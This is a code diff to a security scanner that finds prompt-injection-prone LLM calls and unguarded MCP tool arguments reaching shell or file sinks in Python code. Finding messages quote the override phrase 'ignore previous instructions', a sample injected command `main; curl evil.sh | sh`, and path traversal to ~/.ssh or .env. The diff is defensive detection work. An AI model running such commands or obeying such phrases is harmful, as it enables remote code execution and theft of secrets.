@@ -1,6 +1,6 @@
 import fs from "node:fs";
 import path from "node:path";
-import type { Finding, Severity } from "./types.js";
+import type { Finding, Severity, TraceStep } from "./types.js";
 import { evidenceConfidence, demoteEvidence, isTestFilePath } from "./confidence.js";
 import {
   findCrossToolReference,
@@ -422,6 +422,180 @@ function collectRequestTaintedVars(src: PythonSource, scope: PythonNode, upTo: n
   return tainted;
 }
 
+// Keyword arguments that carry privileged instructions, per SDK:
+// Anthropic `system=`, OpenAI Responses `instructions=`, Gemini
+// `system_instruction=`, and the common `system_prompt=` wrapper convention.
+const PY_SYSTEM_KEYWORDS = ["system", "system_prompt", "instructions", "system_instruction"];
+// Single-string prompt slots with no role separation.
+const PY_PROMPT_KEYWORDS = ["prompt", "input", "contents"];
+// Roles where untrusted input is the *recommended* placement — never flagged.
+const PY_UNPRIVILEGED_ROLES = new Set(["user", "assistant", "tool", "function", "human", "ai"]);
+// LangChain message classes, mapped to the role they carry.
+const PY_MESSAGE_CLASS_ROLES: Array<[RegExp, string]> = [
+  [/(?:^|\.)SystemMessage(?:PromptTemplate)?$/, "system"],
+  [/(?:^|\.)HumanMessage(?:PromptTemplate)?$/, "user"],
+  [/(?:^|\.)AIMessage(?:PromptTemplate)?$/, "assistant"],
+  [/(?:^|\.)ToolMessage$/, "tool"],
+];
+
+interface PyPromptPart {
+  role: string;
+  node: PythonNode;
+}
+
+function pyDictField(dict: PythonNode, key: string): PythonNode | undefined {
+  for (const pair of dict.namedChildren) {
+    if (pair.type !== "pair") continue;
+    const keyNode = pair.childForFieldName("key");
+    const value = pair.childForFieldName("value");
+    if (keyNode?.type === "string" && value && pythonStringValue(keyNode) === key) return value;
+  }
+  return undefined;
+}
+
+/** A plain string literal's value, or undefined for f-strings / non-strings. */
+function pyLiteralString(node: PythonNode): string | undefined {
+  if (node.type !== "string") return undefined;
+  if (node.namedChildren.some((child) => child.type === "interpolation")) return undefined;
+  return pythonStringValue(node);
+}
+
+/**
+ * Role-tagged prompt parts from a message list literal: OpenAI/Anthropic
+ * `{"role": ..., "content": ...}` dicts, LangChain `SystemMessage(...)`
+ * objects, and LangChain `("system", "...")` tuples.
+ */
+function pyMessageListParts(list: PythonNode, parts: PyPromptPart[]): void {
+  for (const element of list.namedChildren) {
+    if (element.type === "dictionary") {
+      const content = pyDictField(element, "content");
+      if (!content) continue;
+      const roleNode = pyDictField(element, "role");
+      const role = roleNode ? (pyLiteralString(roleNode)?.toLowerCase() ?? "unknown") : "unknown";
+      parts.push({ role, node: content });
+    } else if (element.type === "call") {
+      const fn = element.childForFieldName("function");
+      const role = PY_MESSAGE_CLASS_ROLES.find(([pattern]) => fn && pattern.test(pythonTargetText(fn)))?.[1];
+      if (!role) continue;
+      const args = element.childForFieldName("arguments");
+      const content =
+        args?.namedChildren.find((arg) => arg.type !== "keyword_argument") ??
+        args?.namedChildren
+          .find((arg) => arg.type === "keyword_argument" && arg.childForFieldName("name")?.text === "content")
+          ?.childForFieldName("value");
+      if (content) parts.push({ role, node: content });
+    } else if (element.type === "tuple" && element.namedChildren.length === 2) {
+      const role = pyLiteralString(element.namedChildren[0])?.toLowerCase();
+      if (role) parts.push({ role: role === "human" ? "user" : role, node: element.namedChildren[1] });
+    }
+  }
+}
+
+/**
+ * Resolve `messages=msgs` to the list literal most recently assigned to
+ * `msgs` in the same scope. Anything else (a list built with `.append`, a
+ * function's return value) is left unresolved: we can't prove which role
+ * the data landed in, so it isn't reported at default evidence.
+ */
+function pyResolveList(src: PythonSource, scope: PythonNode, node: PythonNode, beforeIndex: number): PythonNode | undefined {
+  if (node.type === "list") return node;
+  if (node.type !== "identifier") return undefined;
+  const assignment = src.ast.assignments
+    .filter(
+      (candidate) =>
+        candidate.node.startIndex >= scope.startIndex &&
+        candidate.node.endIndex <= beforeIndex &&
+        candidate.targets.some((target) => pythonTargetText(target) === node.text),
+    )
+    .at(-1);
+  return assignment?.value.type === "list" ? assignment.value : undefined;
+}
+
+function pyPromptParts(src: PythonSource, scope: PythonNode, call: PythonCallNode): PyPromptPart[] {
+  const parts: PyPromptPart[] = [];
+  for (const key of PY_SYSTEM_KEYWORDS) {
+    const value = call.keywords.get(key);
+    if (value) parts.push({ role: "system", node: value });
+  }
+  const messages = call.keywords.get("messages");
+  if (messages) {
+    const list = pyResolveList(src, scope, messages, call.node.startIndex);
+    if (list) pyMessageListParts(list, parts);
+  }
+  for (const key of PY_PROMPT_KEYWORDS) {
+    const value = call.keywords.get(key);
+    if (value) parts.push({ role: "prompt", node: value });
+  }
+  for (const argument of call.arguments) {
+    const list = pyResolveList(src, scope, argument, call.node.startIndex);
+    if (list) pyMessageListParts(list, parts);
+    else parts.push({ role: "prompt", node: argument });
+  }
+  return parts;
+}
+
+/** Text composed from pieces: f-string, `+`/`%` concatenation, or `.format(...)`. */
+function isPyComposition(node: PythonNode): boolean {
+  if (node.type === "string") return node.namedChildren.some((child) => child.type === "interpolation");
+  if (node.type === "concatenated_string") return true;
+  if (node.type === "binary_operator") {
+    const operator = node.childForFieldName("operator")?.text;
+    return operator === "+" || operator === "%";
+  }
+  if (node.type === "call") {
+    return /\.format$/.test(node.childForFieldName("function")?.text ?? "");
+  }
+  return false;
+}
+
+interface PyTaint {
+  /** line (0-based) of the request read that tainted this name */
+  line: number;
+  /** the value was composed (f-string/concat) with other text on the way */
+  composed: boolean;
+}
+
+/**
+ * Request-tainted names in scope with where they came from, propagating
+ * through assignment to a fixpoint (see `collectRequestTaintedVars`).
+ */
+function collectRequestTaint(src: PythonSource, scope: PythonNode, upTo: number): Map<string, PyTaint> {
+  const tainted = new Map<string, PyTaint>();
+  const assignments = src.ast.assignments.filter(
+    (assignment) =>
+      assignment.node.startIndex >= scope.startIndex &&
+      assignment.node.endIndex <= scope.endIndex &&
+      assignment.node.startPosition.row <= upTo,
+  );
+  for (let pass = 0; pass < 4; pass++) {
+    let changed = false;
+    for (const assignment of assignments) {
+      let origin: PyTaint | undefined;
+      if (matchesAny(assignment.value.text, REQUEST_PATTERNS)) {
+        origin = { line: assignment.node.startPosition.row, composed: false };
+      } else {
+        for (const [name, info] of tainted) {
+          if (pythonNodeContainsText(assignment.value, name)) {
+            origin = info;
+            break;
+          }
+        }
+      }
+      if (!origin) continue;
+      const composed = origin.composed || isPyComposition(assignment.value);
+      for (const targetNode of assignment.targets) {
+        const target = pythonTargetText(targetNode);
+        const existing = tainted.get(target);
+        if (existing && (existing.composed || !composed)) continue;
+        tainted.set(target, { line: origin.line, composed });
+        changed = true;
+      }
+    }
+    if (!changed) break;
+  }
+  return tainted;
+}
+
 function checkAI001(src: PythonSource, i: number, file: string, ctx: FileContext): Finding | null {
   if (!ctx.fileHasLlm) return null;
   const call = src.ast.callsAtLine(i).find(ctx.isLlmCallNode);
@@ -430,31 +604,71 @@ function checkAI001(src: PythonSource, i: number, file: string, ctx: FileContext
   const scope = pythonScope(src, call.node);
   if (hasSanitization(scope.text.slice(0, call.node.endIndex - scope.startIndex))) return null;
 
-  const directRequest = matchesAny(call.node.text, REQUEST_PATTERNS);
-  const taintedVars = collectRequestTaintedVars(src, scope, i);
-  const taintedVarUsed = [...taintedVars].some((target) =>
-    pythonNodeContainsText(call.node, target),
-  );
-  if (!directRequest && !taintedVarUsed) return null;
+  const taint = collectRequestTaint(src, scope, i);
 
-  const evidence = "likely";
+  for (const part of pyPromptParts(src, scope, call)) {
+    // Untrusted input in a user/assistant-role message is the recommended
+    // pattern — the fix this rule suggests. Never flag it.
+    if (PY_UNPRIVILEGED_ROLES.has(part.role)) continue;
 
-  return {
-    ...findingBase(
-      "AI001",
-      "Prompt injection via user input",
-      "high",
+    let originLine: number | undefined;
+    let composed = isPyComposition(part.node);
+    let via: string | undefined;
+    for (const [name, info] of taint) {
+      if (!pythonNodeContainsText(part.node, name)) continue;
+      originLine = info.line;
+      composed = composed || info.composed;
+      via = name;
+      break;
+    }
+    if (originLine === undefined && matchesAny(part.node.text, REQUEST_PATTERNS)) {
+      originLine = part.node.startPosition.row;
+    }
+    if (originLine === undefined) continue;
+
+    const isSystemRole = part.role === "system" || part.role === "developer";
+    // A user value handed over as the *whole* system prompt is the worst
+    // case. Outside a system role, only text *composed* with instructions is
+    // an injection shape — a bare `prompt=user_text` has no instructions to
+    // override.
+    if (!isSystemRole && !composed) continue;
+
+    const sinkLine = part.node.startPosition.row + 1;
+    const callName = pythonCallName(call);
+    const trace: TraceStep[] = [
+      { kind: "source", file, line: originLine + 1, note: "request data" },
+    ];
+    if (via) trace.push({ kind: "flow", file, line: sinkLine, note: `interpolated via \`${via}\`` });
+    trace.push({
+      kind: "sink",
       file,
-      call.node.startPosition.row + 1,
-    ),
-    summary: "User request data flows into an LLM call without sanitization.",
-    description:
-      "Request parameters (request.json, request.form, etc.) are used in an LLM call without role separation or encoding. An attacker can inject instructions that override your system prompt.",
-    recommendation:
-      'Use separate message roles: messages=[{"role":"system","content":system_prompt},{"role":"user","content":str(user_input)}]',
-    confidence: evidenceConfidence(evidence),
-    evidence,
-  };
+      line: call.node.startPosition.row + 1,
+      note: `${callName} — ${isSystemRole ? `${part.role} role` : `${part.role} field`}`,
+    });
+
+    const evidence = "likely";
+    return {
+      ...findingBase(
+        "AI001",
+        "Prompt injection via user input",
+        isSystemRole ? "high" : "medium",
+        file,
+        sinkLine,
+      ),
+      summary: isSystemRole
+        ? `User request data reaches a ${part.role}-role prompt.`
+        : "User request data is mixed into the prompt string with instructions.",
+      description: isSystemRole
+        ? `Request data reaches the ${part.role} prompt of \`${callName}\`. Anything a user sends becomes privileged instructions: "ignore previous instructions" attacks work directly.`
+        : `Request data is composed into the prompt string of \`${callName}\`, mixing untrusted text with instructions in the same trust context.`,
+      recommendation:
+        'Keep system prompts static. Pass user input as a separate user-role message: messages=[{"role":"system","content":SYSTEM_PROMPT},{"role":"user","content":user_input}]',
+      confidence: evidenceConfidence(evidence),
+      evidence,
+      trace,
+    };
+  }
+  return null;
 }
 
 function checkAI002(src: PythonSource, i: number, file: string, ctx: FileContext): Finding | null {
@@ -503,16 +717,24 @@ function checkAI003(src: PythonSource, i: number, file: string, ctx: FileContext
   // above.
   const parameters = fn.node.childForFieldName("parameters");
   if (parameters && matchesAny(parameters.text, AUTH_DECORATORS)) return null;
+  // Any other FastAPI dependency on the route (`dependencies=[Depends(x)]`,
+  // `Security(x)`, a `Depends(x)` parameter) may well be the auth check under
+  // a name we don't recognize (`require_user`, `check_scope`, ...). We can't
+  // prove absence of auth, so it isn't reported at default evidence.
+  const routeDependencies = [...fn.decorators.map((decorator) => decorator.text), parameters?.text ?? ""];
+  const evidence = routeDependencies.some((text) => /\b(?:Depends|Security)\s*\(/.test(text))
+    ? "heuristic"
+    : "likely";
 
   return {
-    ...findingBase("AI003", "LLM call before authentication", "critical", file, i + 1),
+    ...findingBase("AI003", "LLM call before authentication", "medium", file, i + 1),
     summary: "Route handler makes an LLM call with no visible authentication decorator.",
     description:
       "An LLM call is made in a route handler without @login_required, JWT validation, or equivalent auth middleware. Unauthenticated callers can trigger model usage.",
     recommendation:
       "Add @login_required, @jwt_required, or a Depends(get_current_user) guard before the handler. Always authenticate before any LLM invocation.",
-    confidence: evidenceConfidence("likely"),
-    evidence: "likely",
+    confidence: evidenceConfidence(evidence),
+    evidence,
   };
 }
 
@@ -761,11 +983,28 @@ function checkAI014(src: PythonSource, i: number, file: string, ctx: FileContext
   };
 }
 
+// `index.query(...)` / `collection.query(...)` / `.search(vector)` are generic shapes — an
+// in-memory search index, an ORM, a search engine client. Found scanning
+// jlowin/fastmcp: `self._index.query(query, max_results)` on a BM25 index
+// over the server's own tool catalog was reported as an unfiltered,
+// cross-tenant vector search. Those generic shapes are `likely` only in a
+// file that imports a vector-store/RAG SDK (otherwise `heuristic`);
+// LangChain-style names (`similarity_search`, `as_retriever`, ...) are
+// specific enough on their own.
+const SPECIFIC_VECTOR_SEARCH = /\.\s*(?:similarity_search(?:_with_score)?|max_marginal_relevance_search|as_retriever)\s*\(/;
+const PY_VECTOR_SDK_IMPORT =
+  /^\s*(?:import|from)\s+(?:pinecone|chromadb|qdrant_client|weaviate|pymilvus|lancedb|faiss|langchain\w*|llama_index|pgvector|redisvl|turbopuffer|vecs|upstash_vector|astrapy|marqo|txtai|docarray|haystack|opensearchpy|elasticsearch)\b/m;
+
+function fileImportsVectorSdk(src: PythonSource): boolean {
+  return src.ast.imports.some((node) => PY_VECTOR_SDK_IMPORT.test(node.text));
+}
+
 function checkVEC001(src: PythonSource, i: number, file: string): Finding | null {
   const call = src.ast.callsAtLine(i).find((candidate) =>
     matchesAny(candidate.node.text, VECTOR_SEARCH_PATTERNS),
   );
   if (!call) return null;
+  const evidence = SPECIFIC_VECTOR_SEARCH.test(call.node.text) || fileImportsVectorSdk(src) ? "likely" : "heuristic";
   const filterNames = [
     "expr",
     "filter",
@@ -829,8 +1068,8 @@ function checkVEC001(src: PythonSource, i: number, file: string): Finding | null
       "Without a filter, this search returns results from all documents in the vector store. User A's query can retrieve User B's private documents, which the LLM then surfaces in its response.",
     recommendation:
       "Pass a filter scoped to the authenticated user: vectorstore.similarity_search(query, k=5, filter={'user_id': current_user.id})",
-    confidence: evidenceConfidence("likely"),
-    evidence: "likely",
+    confidence: evidenceConfidence(evidence),
+    evidence,
   };
 }
 
@@ -1094,6 +1333,333 @@ function checkMCP009(src: PythonSource, i: number, file: string, ctx: FileContex
 
 // ── Registered rule functions ─────────────────────────────────────────────
 
+// ── MCP013 / MCP014: tool argument → shell command / file path ─────────────
+// Python counterpart of rules/mcp-tool-arg-sink.ts — see that file for the
+// precision contract. A model-controlled tool argument is reported at default
+// evidence only when it is *composed into a fixed command* (MCP013) or *joined
+// onto a base directory* (MCP014) with no visible guard. A bare
+// `subprocess.run(command, shell=True)` / `open(path)` is a run-anything /
+// read-anything tool by design and stays `heuristic`.
+
+const PY_CALL_TOOL_DECORATOR = /@\s*[\w.]*\.call_tool\s*\(/;
+// Annotations that cannot carry shell metacharacters or `../`.
+const PY_RESTRICTIVE_ANNOTATION = /^(?:int|float|bool|Literal\b|.*Enum\b)|pattern\s*=|regex\s*=/;
+const PY_ALWAYS_SHELL = new Set([
+  "os.system", "os.popen", "subprocess.getoutput", "subprocess.getstatusoutput",
+  "asyncio.create_subprocess_shell", "create_subprocess_shell",
+]);
+const PY_SHELL_OPTED = new Set([
+  "subprocess.run", "subprocess.call", "subprocess.check_call", "subprocess.check_output", "subprocess.Popen",
+]);
+const PY_FS_FUNCS = new Set([
+  "open", "io.open", "aiofiles.open", "os.remove", "os.unlink", "os.listdir", "os.rmdir",
+  "shutil.rmtree", "shutil.copy", "shutil.copyfile", "shutil.move",
+]);
+const PY_PATH_METHODS = /\.(?:read_text|read_bytes|write_text|write_bytes|unlink|open|iterdir|rmdir)$/;
+const PY_GUARD_CALL = /(?:^|[._])(?:quote|escape|sanitize|sanitise|validate|is_valid|check|safe|allowed|within|contains|guard|verify|clean|fullmatch|match|search|startswith|is_relative_to|commonpath|realpath|relative_to)(?:$|_)/i;
+
+interface PyToolHandler {
+  fn: PythonFunctionNode;
+  toolName: string;
+  /** tool-argument name → declaration row */
+  params: Map<string, number>;
+  /** dict-valued argument containers (low-level `arguments`) */
+  argObjects: Set<string>;
+}
+
+interface PySinkTaint {
+  field: string;
+  line: number;
+  composed: boolean;
+  baseJoined: boolean;
+}
+
+function pyParamName(param: PythonNode): string | undefined {
+  if (param.type === "identifier") return param.text;
+  const named = param.childForFieldName("name");
+  if (named) return named.text;
+  return param.namedChildren.find((child) => child.type === "identifier")?.text;
+}
+
+function pyToolHandler(src: PythonSource, node: PythonNode): PyToolHandler | undefined {
+  const fn = src.ast.enclosingFunction(node);
+  if (!fn) return undefined;
+  const parameters = fn.node.childForFieldName("parameters")?.namedChildren ?? [];
+  if (fn.decorators.some((decorator) => PY_CALL_TOOL_DECORATOR.test(decorator.text))) {
+    // async def call_tool(name: str, arguments: dict)
+    const argumentsName = parameters[1] ? pyParamName(parameters[1]) : undefined;
+    if (!argumentsName) return undefined;
+    return { fn, toolName: "(call_tool handler)", params: new Map(), argObjects: new Set([argumentsName]) };
+  }
+  if (isMcpToolFunction(fn)) {
+    const params = new Map<string, number>();
+    for (const param of parameters) {
+      const name = pyParamName(param);
+      if (!name || ["self", "cls", "ctx", "context"].includes(name)) continue;
+      const annotation = param.childForFieldName("type")?.text ?? "";
+      if (/\bContext\b/.test(annotation) || PY_RESTRICTIVE_ANNOTATION.test(annotation)) continue;
+      params.set(name, param.startPosition.row);
+    }
+    return { fn, toolName: fn.name, params, argObjects: new Set() };
+  }
+  return undefined;
+}
+
+/** `arguments["host"]` / `arguments.get("host")` → "host" when `arguments` is a tool-argument container. */
+function pyArgField(node: PythonNode, handler: PyToolHandler): string | undefined {
+  if (node.type === "subscript") {
+    const value = node.childForFieldName("value");
+    const key = node.childForFieldName("subscript");
+    if (value && key?.type === "string" && handler.argObjects.has(value.text)) return pythonStringValue(key);
+  }
+  if (node.type === "call") {
+    const fn = node.childForFieldName("function");
+    const object = fn?.type === "attribute" ? fn.childForFieldName("object") : undefined;
+    const first = node.childForFieldName("arguments")?.namedChildren[0];
+    if (fn?.childForFieldName("attribute")?.text === "get" && object && handler.argObjects.has(object.text) && first?.type === "string") {
+      return pythonStringValue(first);
+    }
+  }
+  return undefined;
+}
+
+function pyExprTaint(node: PythonNode, handler: PyToolHandler, vars: Map<string, PySinkTaint>): PySinkTaint | undefined {
+  if (node.type === "parenthesized_expression" && node.namedChildren[0]) return pyExprTaint(node.namedChildren[0], handler, vars);
+  const field = pyArgField(node, handler);
+  if (field !== undefined) return { field, line: node.startPosition.row, composed: false, baseJoined: false };
+  if (node.type === "identifier") return vars.get(node.text);
+
+  if (node.type === "string") {
+    const parts = node.namedChildren.filter((child) => child.type === "interpolation" || child.type === "string_content");
+    let literalBefore = "";
+    let priorUntainted = false;
+    for (const part of parts) {
+      if (part.type === "string_content") {
+        literalBefore += part.text;
+        continue;
+      }
+      const expression = part.namedChildren[0];
+      const taint = expression ? pyExprTaint(expression, handler, vars) : undefined;
+      if (!taint) {
+        priorUntainted = true;
+        literalBefore += "{}";
+        continue;
+      }
+      const hasFixedText = parts.some((p) => p.type === "string_content" && p.text.trim() !== "");
+      const baseJoined = taint.baseJoined || (/\/$/.test(literalBefore) && (priorUntainted || literalBefore.length > 1));
+      return { ...taint, composed: taint.composed || hasFixedText, baseJoined };
+    }
+    return undefined;
+  }
+
+  if (node.type === "binary_operator") {
+    const operator = node.childForFieldName("operator")?.text;
+    const leftNode = node.childForFieldName("left");
+    const rightNode = node.childForFieldName("right");
+    if (!leftNode || !rightNode) return undefined;
+    const left = pyExprTaint(leftNode, handler, vars);
+    const right = pyExprTaint(rightNode, handler, vars);
+    const taint = left ?? right;
+    if (!taint) return undefined;
+    if (operator === "/") return { ...taint, baseJoined: taint.baseJoined || (!left && !!right) };
+    if (operator === "+") {
+      return { ...taint, composed: true, baseJoined: taint.baseJoined || (!left && !!right && /\/["']$/.test(leftNode.text)) };
+    }
+    if (operator === "%") return { ...taint, composed: true };
+    return undefined;
+  }
+
+  if (node.type === "call") {
+    const fnNode = node.childForFieldName("function");
+    const name = fnNode ? pythonTargetText(fnNode) : "";
+    const args = node.childForFieldName("arguments")?.namedChildren ?? [];
+    if (name === "os.path.join" || name === "posixpath.join") {
+      for (let index = 0; index < args.length; index += 1) {
+        const taint = pyExprTaint(args[index], handler, vars);
+        if (!taint) continue;
+        const priorUntainted = args.slice(0, index).some((arg) => !pyExprTaint(arg, handler, vars));
+        return { ...taint, baseJoined: taint.baseJoined || priorUntainted };
+      }
+      return undefined;
+    }
+    if (/\.format$/.test(name)) {
+      for (const arg of args) {
+        const value = arg.type === "keyword_argument" ? arg.childForFieldName("value") : arg;
+        const taint = value ? pyExprTaint(value, handler, vars) : undefined;
+        if (taint) return { ...taint, composed: true };
+      }
+      return undefined;
+    }
+    // str(x) / Path(x) / x.strip() keep the value as-is.
+    if ((name === "str" || name === "Path" || name === "pathlib.Path") && args.length === 1) {
+      return pyExprTaint(args[0], handler, vars);
+    }
+    if (fnNode?.type === "attribute" && /^(?:strip|lower|upper)$/.test(fnNode.childForFieldName("attribute")?.text ?? "")) {
+      const object = fnNode.childForFieldName("object");
+      return object ? pyExprTaint(object, handler, vars) : undefined;
+    }
+  }
+  return undefined;
+}
+
+function pyHandlerTaint(src: PythonSource, handler: PyToolHandler, upTo: number): Map<string, PySinkTaint> {
+  const vars = new Map<string, PySinkTaint>();
+  for (const [name, line] of handler.params) vars.set(name, { field: name, line, composed: false, baseJoined: false });
+  const body = handler.fn.body;
+  const assignments = src.ast.assignments.filter(
+    (assignment) =>
+      assignment.node.startIndex >= body.startIndex &&
+      assignment.node.endIndex <= body.endIndex &&
+      assignment.node.startIndex < upTo,
+  );
+  for (let pass = 0; pass < 4; pass += 1) {
+    let changed = false;
+    for (const assignment of assignments) {
+      if (assignment.targets.length !== 1 || assignment.targets[0].type !== "identifier") continue;
+      const target = assignment.targets[0].text;
+      if (vars.has(target)) continue;
+      // args = arguments or {} → the container itself
+      if (assignment.value.text.split(/\s+or\s+/)[0] && handler.argObjects.has(assignment.value.text.split(/\s+or\s+/)[0].trim())) {
+        if (!handler.argObjects.has(target)) {
+          handler.argObjects.add(target);
+          changed = true;
+        }
+        continue;
+      }
+      const taint = pyExprTaint(assignment.value, handler, vars);
+      if (taint) {
+        vars.set(target, taint);
+        changed = true;
+      }
+    }
+    if (!changed) break;
+  }
+  return vars;
+}
+
+/** Any guard on the tainted names in the handler: a guard-named call or an `x in ALLOWED` membership test. */
+function pyIsGuarded(src: PythonSource, handler: PyToolHandler, names: Set<string>, sink: PythonCallNode): boolean {
+  for (const call of callsWithinNode(src, handler.fn.body)) {
+    if (call.node.id === sink.node.id) continue;
+    if (!PY_GUARD_CALL.test(pythonCallName(call))) continue;
+    if ([...names].some((name) => wordRe(name).test(call.node.text))) return true;
+  }
+  for (const comparison of pythonDescendants(handler.fn.body, "comparison_operator")) {
+    if (!/\bin\b/.test(comparison.text)) continue;
+    if ([...names].some((name) => wordRe(name).test(comparison.text))) return true;
+  }
+  return false;
+}
+
+function pySubprocessNames(src: PythonSource): Map<string, string> {
+  // `from subprocess import run as sh_run` → sh_run → subprocess.run
+  const aliases = new Map<string, string>();
+  for (const node of src.ast.imports) {
+    const match = /^from\s+(subprocess|os|asyncio|shutil)\s+import\s+([\s\S]+)$/.exec(node.text.trim());
+    if (!match) continue;
+    for (const entry of match[2].replace(/[()\n]/g, " ").split(",")) {
+      const [original, alias] = entry.trim().split(/\s+as\s+/);
+      if (original) aliases.set((alias ?? original).trim(), `${match[1]}.${original.trim()}`);
+    }
+  }
+  return aliases;
+}
+
+function pySinkKind(call: PythonCallNode, aliases: Map<string, string>): { kind: "shell" | "fs"; target?: PythonNode } | undefined {
+  const raw = pythonCallName(call);
+  const name = aliases.get(raw) ?? raw;
+  const first = call.arguments[0] ?? call.keywords.get("args") ?? call.keywords.get("cmd") ?? call.keywords.get("file");
+  if (PY_ALWAYS_SHELL.has(name)) return { kind: "shell", target: first };
+  if (PY_SHELL_OPTED.has(name)) {
+    return call.keywords.get("shell")?.text === "True" ? { kind: "shell", target: first } : undefined;
+  }
+  if (PY_FS_FUNCS.has(name)) return { kind: "fs", target: first };
+  if (PY_PATH_METHODS.test(name) && call.function.type === "attribute") {
+    return { kind: "fs", target: call.function.childForFieldName("object") ?? undefined };
+  }
+  return undefined;
+}
+
+function pyDispatchedToolName(node: PythonNode, handler: PyToolHandler): string {
+  let current: PythonNode | null = node.parent;
+  while (current && current.id !== handler.fn.node.id) {
+    if (current.type === "if_statement" || current.type === "elif_clause" || current.type === "case_clause") {
+      const condition = current.childForFieldName("condition") ?? current.namedChildren[0];
+      const match = condition ? /==\s*["']([\w.:-]+)["']|["']([\w.:-]+)["']\s*==|^\s*["']([\w.:-]+)["']/.exec(condition.text) : null;
+      if (match) return match[1] ?? match[2] ?? match[3];
+    }
+    current = current.parent;
+  }
+  return handler.toolName;
+}
+
+function checkMcpToolArgSink(src: PythonSource, i: number, file: string, ctx: FileContext): Finding | null {
+  if (!ctx.fileHasMcpServer) return null;
+  const aliases = pySubprocessNames(src);
+  for (const call of src.ast.callsAtLine(i)) {
+    const sink = pySinkKind(call, aliases);
+    if (!sink?.target) continue;
+    const handler = pyToolHandler(src, call.node);
+    if (!handler || (handler.params.size === 0 && handler.argObjects.size === 0)) continue;
+    const vars = pyHandlerTaint(src, handler, call.node.startIndex);
+    const taint = pyExprTaint(sink.target, handler, vars);
+    if (!taint) continue;
+
+    const names = new Set<string>([taint.field]);
+    for (const [name, info] of vars) if (info.field === taint.field) names.add(name);
+    if (pyIsGuarded(src, handler, names, call)) continue;
+
+    const intentional = sink.kind === "shell" ? taint.composed : taint.baseJoined;
+    const evidence = intentional ? (sink.kind === "shell" ? "proven" : "likely") : "heuristic";
+    const toolName = pyDispatchedToolName(call.node, handler);
+    const sinkName = pythonCallName(call);
+    const ruleId = sink.kind === "shell" ? "MCP013" : "MCP014";
+    const title = sink.kind === "shell"
+      ? "MCP tool argument reaches a shell command"
+      : "MCP tool argument used as a file path without containment";
+    const severity: Severity = !intentional ? "medium" : sink.kind === "shell" ? "critical" : "high";
+
+    const trace: TraceStep[] = [
+      { kind: "source", file, line: taint.line + 1, note: `tool argument \`${taint.field}\` of MCP tool \`${toolName}\` (model-controlled)` },
+    ];
+    if (sink.target.startPosition.row !== call.node.startPosition.row || sink.target.type === "identifier") {
+      trace.push({
+        kind: "flow",
+        file,
+        line: sink.target.startPosition.row + 1,
+        note: sink.kind === "shell" ? "composed into a command string" : "joined onto a base path",
+      });
+    }
+    trace.push({
+      kind: "sink",
+      file,
+      line: i + 1,
+      note: sink.kind === "shell" ? `${sinkName} (runs a shell)` : `${sinkName} (filesystem)`,
+    });
+
+    return {
+      ...findingBase(ruleId, title, severity, file, i + 1),
+      summary: sink.kind === "shell"
+        ? intentional
+          ? `MCP tool \`${toolName}\` interpolates a model-controlled argument into a shell command.`
+          : `MCP tool \`${toolName}\` runs a model-supplied command line verbatim.`
+        : intentional
+          ? `MCP tool \`${toolName}\` joins a model-controlled path onto a base directory without checking it stays inside.`
+          : `MCP tool \`${toolName}\` reads or writes any path the model supplies.`,
+      description: sink.kind === "shell"
+        ? "Tool arguments are written by the model, and a prompt injection in anything the model reads controls them. Composed into a shell command, `main; curl evil.sh | sh` turns this tool into remote code execution."
+        : "A model-controlled path can walk out of the base directory with `../` (or replace it entirely with an absolute path, which os.path.join and pathlib accept), letting a prompt injection read secrets like ~/.ssh or .env.",
+      recommendation: sink.kind === "shell"
+        ? "Pass an argument list without shell=True (subprocess.run([\"git\", \"log\", branch])), validate the value with a strict pattern or allowlist, and type it as Literal[...] where possible."
+        : "Resolve the final path (Path(base, name).resolve()) and reject it unless it is_relative_to(base.resolve()).",
+      confidence: evidenceConfidence(evidence),
+      evidence,
+      trace,
+    };
+  }
+  return null;
+}
+
 interface FileContext {
   fileHasLlm: boolean;
   fileImportsTypesafe: boolean;
@@ -1124,6 +1690,7 @@ const PYTHON_RULES: RuleChecker[] = [
   checkMCP008,
   checkMCP009,
   checkMCP011,
+  checkMcpToolArgSink,
 ];
 
 // ── File discovery ────────────────────────────────────────────────────────
